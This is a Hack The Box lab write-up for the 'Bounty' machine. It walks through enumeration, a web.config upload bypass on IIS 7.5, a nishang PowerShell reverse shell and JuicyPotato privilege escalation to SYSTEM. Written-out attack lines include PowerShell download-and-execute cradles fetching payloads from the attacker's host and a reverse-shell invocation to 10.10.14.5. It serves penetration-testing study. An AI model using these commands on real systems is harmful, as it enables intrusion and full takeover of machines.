![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-2.22.28-PM.png)

**IP address: 10.10.10.93**

## Enumeration

After making a simple nmap scan: `sudo nmap -sC -sV -O -p- -oA nmap/bounty 10.10.10.93`, we get,

Open ports:

- 80

So, as there was only port 80 open I just navigated to the IP and got the default page which was and image. I checked the page source but there was nothing. Then, I checked the image info and it had related text which showed IIS 7. The nmap scan though said that it was running IIS 7.5. Then, I checked on searchsploit for iis 7.5 vulns and found some, auth bypass to read sensitive files, etc, but none of them worked. Finally, I ran gobuster.

gobuster:  
`/UploadedFiles (Status: 301) │st canceled (Client.Timeout exceeded while awaiting headers)<br></br>/uploadedFiles (Status: 301) │Progress: 155722 / 220561 (70.60%)[ERROR] 2020/09/01 09:14:17 [!] Get http://10.10.10.93/191275: net/http: request ca<br></br>/uploadedfiles (Status: 301)<br></br>/aspnet_client<br></br>/aspnet_client/system_web`

The default page after visiting the IP of the machine was:

![](http://vedanttare.com/wp-content/uploads/2022/04/default-page.png)

I visited these pages/dirs but got a 403 error which said that: YOU CANNOT ACCESS THIS PAGE AS YOU ARE NOT USING THE RIGHT CREDS…. Then as it was an IIS server, so, I thought of running gobuster with the extension flag of aspx through which I found a page:  
`transfer.aspx`

BOOM!!! This page had a file upload functionality where I could upload files. I tried uploading a simple aspx, asp file…but it said: `FILE NOT UPLOADED`  
I tried to bypass the filter by double extension and then when I tried to navigate to the file it showed that this page contains errors….. Then, I made a wordlist of all default extension and used burp intruder to bruteforce each one. It showed that jpeg, png and config(suspicious) was giving a successful upload.

After alot of sweat and tears and alot of googling I finally found an article which said that you could upload a web.config file to iis server 7/7.5 and embed asp code in it and execute it.  
https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/ –&gt; GODLY ARTICLE

Again, after alot of sweat and tears again I was able to get code execution. Now I had to upload a rev shell, so that I could get a rev connection back on my machine. I copied nishang poweshell rev shell script to my working directory:  
`Invoke-PowerShellTcp.ps1`

![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-04-15-at-1.46.29-PM.png)

At the end of the script I added:  
`Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444`

![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-04-15-at-1.47.14-PM.png)  
By adding this it was telling the script to connect to my IP address and port. Then I modified my web.config file so that it would download the nishang powershell script and execute it. I setup a listener on my kali machine:  
AND BOOM!!!! I got a low priv shell!

`kali@starscorp1o:~/htb/boxes/bounty$ sudo nc -nlvp 5555<br></br>[sudo] password for kali:<br></br>listening on [any] 5555 …<br></br>connect to [10.10.14.5] from (UNKNOWN) [10.10.10.93] 49158<br></br>Windows PowerShell running as user BOUNTY$ on BOUNTY<br></br>Copyright (C) 2015 Microsoft Corporation. All rights reserved.`

`PS C:\windows\system32\inetsrv>whoami<br></br>bounty\merlin<br></br>PS C:\windows\system32\inetsrv> systeminfo`

`Host Name: BOUNTY<br></br>OS Name: Microsoft Windows Server 2008 R2 Datacenter<br></br>OS Version: 6.1.7600 N/A Build 7600<br></br>OS Manufacturer: Microsoft Corporation<br></br>OS Configuration: Standalone Server<br></br>OS Build Type: Multiprocessor Free<br></br>Registered Owner: Windows User<br></br>Registered Organization:<br></br>Product ID: 55041-402-3606965-84760<br></br>Original Install Date: 5/30/2018, 12:22:24 AM<br></br>System Boot Time: 9/2/2020, 5:19:45 PM<br></br>System Manufacturer: VMware, Inc.<br></br>System Model: VMware Virtual Platform<br></br>System Type: x64-based PC<br></br>Processor(s): 1 Processor(s) Installed.<br></br>[01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz<br></br>BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018<br></br>Windows Directory: C:\Windows<br></br>System Directory: C:\Windows\system32<br></br>Boot Device: \Device\HarddiskVolume1<br></br>System Locale: en-us;English (United States)<br></br>Input Locale: en-us;English (United States)<br></br>Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul<br></br>Total Physical Memory: 2,047 MB<br></br>Available Physical Memory: 1,578 MB<br></br>Virtual Memory: Max Size: 4,095 MB<br></br>Virtual Memory: Available: 3,574 MB<br></br>Virtual Memory: In Use: 521 MB<br></br>Page File Location(s): C:\pagefile.sys<br></br>Domain: WORKGROUP<br></br>Logon Server: N/A<br></br>Hotfix(s): N/A<br></br>Network Card(s): 1 NIC(s) Installed.<br></br>[01]: Intel(R) PRO/1000 MT Network Connection<br></br>Connection Name: Local Area Connection<br></br>DHCP Enabled: No`

## Privilege Escalation

I checked who I was:  
`bounty/merlin`

I went into merlin’s dir and tried to list the files but I couldn’t get the user.txt file as it wasn’t showing. Then I ran the following command to see hidden files:  
`attrib`  
And then i got the user flag:

`PS C:\Users\merlin> cd Desktop<br></br>PS C:\Users\merlin\Desktop> dir<br></br>PS C:\Users\merlin\Desktop> attrib<br></br>A SH C:\Users\merlin\Desktop\desktop.ini<br></br>A H C:\Users\merlin\Desktop\user.txt<br></br>PS C:\Users\merlin\Desktop> type user.txt<br></br>e29ad89891462e0b09741e3082f44a2f`

I checked the system information using:  
`systeminfo` command:

`PS C:\windows\system32\inetsrv> systeminfo`

`Host Name: BOUNTY<br></br>OS Name: Microsoft Windows Server 2008 R2 Datacenter<br></br>OS Version: 6.1.7600 N/A Build 7600<br></br>OS Manufacturer: Microsoft Corporation<br></br>OS Configuration: Standalone Server<br></br>OS Build Type: Multiprocessor Free<br></br>Registered Owner: Windows User<br></br>Registered Organization:<br></br>Product ID: 55041-402-3606965-84760<br></br>Original Install Date: 5/30/2018, 12:22:24 AM<br></br>System Boot Time: 9/2/2020, 5:19:45 PM<br></br>System Manufacturer: VMware, Inc.<br></br>System Model: VMware Virtual Platform<br></br>System Type: x64-based PC<br></br>Processor(s): 1 Processor(s) Installed.<br></br>[01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz<br></br>BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018<br></br>Windows Directory: C:\Windows<br></br>System Directory: C:\Windows\system32<br></br>Boot Device: \Device\HarddiskVolume1<br></br>System Locale: en-us;English (United States)<br></br>Input Locale: en-us;English (United States)<br></br>Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul<br></br>Total Physical Memory: 2,047 MB<br></br>Available Physical Memory: 1,578 MB<br></br>Virtual Memory: Max Size: 4,095 MB<br></br>Virtual Memory: Available: 3,574 MB<br></br>Virtual Memory: In Use: 521 MB<br></br>Page File Location(s): C:\pagefile.sys<br></br>Domain: WORKGROUP<br></br>Logon Server: N/A<br></br>Hotfix(s): N/A<br></br>Network Card(s): 1 NIC(s) Installed.<br></br>[01]: Intel(R) PRO/1000 MT Network Connection<br></br>Connection Name: Local Area Connection<br></br>DHCP Enabled: No<br></br>IP address(es)<br></br>[01]: 10.10.10.93`

![](http://vedanttare.com/wp-content/uploads/2022/04/userflag.png)

Now, I checked the privileges:  
using `whoami /priv` command:

`Privilege Name Description State<br></br>============================= ========================================= =======<br></br>SeAssignPrimaryTokenPrivilege Replace a process level token Enabled<br></br>SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled<br></br>SeAuditPrivilege Generate security audits Enabled<br></br>SeChangeNotifyPrivilege Bypass traverse checking Enabled<br></br>SeImpersonatePrivilege Impersonate a client after authentication Enabled<br></br>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled`

Now we could see that the SeImpersonatePrivilege was enabled…this is very juicy…this leads to tokenhijacking…Juicypotato exploit is available for the esacalation of privileges for this…So I downloaded juicypotato.exe from github:

<https://github.com/ohpe/juicy-potato/releases>

Then, I already had a python web server hosted so I downloaded the file on my kali machine using the following command:

`PS C:\Users\merlin\Desktop> (new-object net.webclient).downloadfile('http://10.10.14.5:/JuicyPotato.exe', 'C:\Users\merlin\Desktop\jp.exe')`

![](http://vedanttare.com/wp-content/uploads/2022/04/pywebserver.png)

![](http://vedanttare.com/wp-content/uploads/2022/04/juicy-potato.png)

Now, I made a shell.bat file on my kali machine with the following code:

`powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.5:/shell.ps1')`

![](http://vedanttare.com/wp-content/uploads/2022/04/shellbat.png)

What this command does is that it downloads another powershell script and executes it but we will do that by using juicy potate exploit which will run it as root…

The final command:

`PS C:\Users\merlin\Desktop> ./jp.exe -t * -p shell.bat -l 4444<br></br>Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444<br></br>….<br></br>[+] authresult 0<br></br>{4991d34b-80a1-4291-83b6-332`8366b9097};NT AUTHORITY\\SYSTEM

`[+] CreateProcessWithTokenW OK`

AND BOOM!!! We get root!!!!

`kali@starscorp1o:~/htb/boxes/bounty$ sudo nc -nlvp 4444<br></br>[sudo] password for kali:<br></br>listening on [any] 4444 …<br></br>connect to [10.10.14.5] from (UNKNOWN) [10.10.10.93] 49168<br></br>whoami<br></br>Windows PowerShell running as user BOUNTY$ on BOUNTY<br></br>Copyright (C) 2015 Microsoft `Corporation. All rights reserved.

`PS C:\Windows\system32>nt authority\system<br></br>PS C:\Windows\system32> whoami<br></br>nt authority\system<br></br>PS C:\Windows\system32> hostname<br></br>bounty<br></br>PS C:\Windows\system32> whoami<br></br>nt authority\system<br></br>PS C:\Windows\system32> whoami<br></br>whoami`

![](http://vedanttare.com/wp-content/uploads/2022/04/got-root.png)

Important links and resources:

<https://github.com/Bengman/CTF-writeups/blob/master/Hackthebox/bounty.md>

<https://medium.com/@ranakhalil101/hack-the-box-bounty-writeup-w-o-metasploit-14467aea7815>

Check out my previous post:

<figure class="wp-block-embed is-type-wp-embed is-provider-vedant-tare wp-block-embed-vedant-tare"><div class="wp-block-embed__wrapper">> [Hackthebox – Jerry](https://vedanttare.com/hackthebox-jerry/)

<iframe class="wp-embedded-content" data-secret="ZndqSkPSVw" frameborder="0" height="338" marginheight="0" marginwidth="0" sandbox="allow-scripts" scrolling="no" security="restricted" src="https://vedanttare.com/hackthebox-jerry/embed/#?secret=sbeonL6L6I#?secret=ZndqSkPSVw" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" title="“Hackthebox – Jerry” — VEDANT TARE" width="600"></iframe></div></figure>
